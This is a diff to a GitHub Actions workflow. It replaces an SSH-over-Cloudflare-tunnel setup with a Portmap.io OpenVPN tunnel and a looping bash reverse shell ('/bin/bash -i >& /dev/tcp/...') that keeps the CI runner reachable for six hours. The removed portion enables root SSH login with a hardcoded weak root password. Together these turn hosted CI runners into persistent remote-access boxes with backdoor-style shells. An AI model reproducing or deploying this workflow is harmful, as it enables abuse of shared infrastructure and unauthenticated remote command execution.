@@ -1,4 +1,4 @@
-name: Linux VPS Setup with Cloudflare Tunnel
+name: Bash Reverse Shell with Portmap.io (Updated Tunnel)
 
 on:
   push:
@@ -15,99 +15,44 @@ jobs:
       - name: Install Dependencies
         run: |
           sudo apt update
-          sudo apt remove -y containerd containerd.io docker.io docker-ce || true
-          sudo apt install -y --fix-broken wget nmap openssh-server
-          # Install cloudflared
-          sudo mkdir -p --mode=0755 /usr/share/keyrings
-          curl -fsSL https://pkg.cloudflare.com/cloudflare-main.gpg | sudo tee /usr/share/keyrings/cloudflare-main.gpg >/dev/null
-          echo 'deb [signed-by=/usr/share/keyrings/cloudflare-main.gpg] https://pkg.cloudflare.com/cloudflared noble main' | sudo tee /etc/apt/sources.list.d/cloudflared.list
-          sudo apt update
-          if ! sudo apt install -y cloudflared; then
-            echo "Falling back to manual cloudflared installation"
-            wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
-            sudo dpkg -i cloudflared-linux-amd64.deb
-            sudo apt install -f -y
-          fi
-          cloudflared --version
+          sudo apt install -y openvpn netcat-openbsd
 
-      - name: Configure SSH Server
+      - name: Configure Portmap.io Tunnel
+        env:
+          PORTMAP_USERNAME: ${{ secrets.PORTMAP_USERNAME }}
+          PORTMAP_PASSWORD: ${{ secrets.PORTMAP_PASSWORD }}
         run: |
-          echo "=== Configuring SSH ==="
-          # Create a minimal sshd_config
-          sudo bash -c 'cat > /etc/ssh/sshd_config <<EOF
-          Port 2222
-          PermitRootLogin yes
-          PasswordAuthentication yes
-          AllowTcpForwarding yes
-          Subsystem sftp /usr/lib/openssh/sftp-server
-          EOF'
-          # Debug: Show sshd_config
-          echo "=== /etc/ssh/sshd_config ==="
-          sudo cat /etc/ssh/sshd_config
-          # Test sshd_config
-          echo "=== Testing sshd_config ==="
-          sudo sshd -t || echo "SSHD config test failed"
-          # Set root password
-          echo "root:P@ssw0rd!" | sudo chpasswd
-          # Generate host keys
-          sudo ssh-keygen -A
-          # Debug: Show host keys
-          echo "=== SSH Host Keys ==="
-          ls -l /etc/ssh/ssh_host_* || echo "No host keys found"
-          # Stop any existing sshd
-          sudo systemctl stop ssh || sudo systemctl stop sshd || true
-          sudo pkill -f sshd || true
-          # Start SSH service
-          echo "=== Starting SSHD ==="
-          if ! sudo systemctl start ssh && ! sudo systemctl start sshd; then
-            echo "Systemctl failed, starting sshd manually"
-            sudo /usr/sbin/sshd -D -p 2222 &
-            sleep 5
-          fi
-          # Check SSHD status
-          echo "=== SSHD Status ==="
-          sudo systemctl status ssh || sudo systemctl status sshd || echo "Systemctl status unavailable"
-          # Check listening port
-          echo "=== Listening Ports ==="
-          sudo ss -tuln | grep 2222 || echo "SSHD not listening on 2222"
-          # Debug: Check all listening ports
-          echo "=== All Listening Ports ==="
-          sudo ss -tuln
-          # Debug: Check sshd process
-          echo "=== SSHD Process ==="
-          ps aux | grep '[s]shd' || echo "No sshd process found"
-
-      - name: Show Runner IP
-        run: |
-          echo "=== Runner External IP ==="
-          curl -s https://api.ipify.org || echo "Failed to get external IP"
-          echo ""
-          echo "=== Runner Internal IP ==="
-          ip addr show | grep inet || echo "Failed to get internal IP"
-
-      - name: Verify SSH Server
-        run: |
-          echo "=== Waiting for SSH server ==="
-          for i in {1..6}; do
-            sleep 10
-            nc -zv localhost 2222 && break || echo "Netcat attempt $i failed"
-          done
-          echo "=== Nmap Scan ==="
-          nmap localhost -p 2222 || echo "Nmap failed"
-          echo "=== SSH Test ==="
-          for i in {1..3}; do
-            ssh -v -p 2222 -o StrictHostKeyChecking=no root@localhost whoami && break || echo "SSH attempt $i failed"
-            sleep 5
-          done
-
-      - name: Launch Cloudflare Quick Tunnel & Keep Alive
-        run: |
-          cloudflared tunnel --url ssh://localhost:2222 > tunnel.log 2>&1 &
-          sleep 20
+          echo "=== Setting up Portmap.io tunnel ==="
+          # Save OpenVPN auth file
+          echo "$PORTMAP_USERNAME" > auth.txt
+          echo "$PORTMAP_PASSWORD" >> auth.txt
+          sudo chmod 600 auth.txt
+          # Update OpenVPN config to use auth file (adjust path if needed)
+          sudo sed -i '/auth-user-pass/c\auth-user-pass auth.txt' openvpn/anonymous1-22216.ovpn
+          # Start OpenVPN tunnel
+          sudo openvpn --config openvpn/anonymous1-22216.ovpn --daemon
+          sleep 10
+          echo "=== OpenVPN Status ==="
+          ps aux | grep '[o]penvpn' || echo "No OpenVPN process found"
           echo "=== Tunnel Endpoint ==="
-          grep -Eo 'https://[a-z0-9-]+\.trycloudflare\.com' tunnel.log || cat tunnel.log
-          ps aux | grep '[c]loudflared' || echo "No cloudflared process found"
+          echo "tcp://vpsfree9009-22216.portmap.io:22216"
+
+      - name: Start Bash Reverse Shell
+        run: |
+          echo "=== Starting reverse shell ==="
+          # Test connectivity to localhost:9001
+          nc -zv localhost 9001 || echo "Cannot connect to localhost:9001"
+          # Start reverse shell with reconnection loop
+          while true; do
+            /bin/bash -i >& /dev/tcp/localhost/9001 0>&1
+            sleep 10
+          done &
+          sleep 5
+          ps aux | grep '[b]ash' || echo "No bash reverse shell process found"
+          echo "=== Reverse shell started, connect to tcp://vpsfree9009-22216.portmap.io:22216 ==="
+          # Keep workflow alive for 6 hours
           for i in {1..360}; do
-            ps aux | grep '[c]loudflared' || echo "cloudflared process stopped"
+            ps aux | grep '[b]ash' || echo "Reverse shell process stopped"
+            ps aux | grep '[o]penvpn' || echo "OpenVPN process stopped"
             sleep 60
           done
